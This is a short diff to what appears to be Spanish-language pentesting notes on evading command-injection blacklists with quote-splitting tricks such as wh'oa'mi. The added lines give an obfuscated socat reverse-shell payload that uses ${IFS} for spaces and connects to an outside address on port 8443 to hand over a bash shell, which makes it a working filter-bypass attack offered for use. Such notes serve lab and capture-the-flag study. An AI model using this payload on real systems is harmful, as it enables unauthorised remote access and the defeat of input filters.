@@ -58,6 +58,8 @@ Ademas del blacklist de operadores, puede haber un blacklist de comandos generan
 ' y "
 #Son strs usalmente ignorados por bash y ps, generando que el agregado de estos bypasee la blacklist pero la shell continue interpretando el comando original.
 # De esta forma quedaria wh'oa'mi por ejemplo
+'s'o'c'a't'${IFS}TCP4:10.10.14.18:8443${IFS}EXEC:bash
+#Combinacion usando socat y IFS para espacios
 
 	Linux
 $@ o \
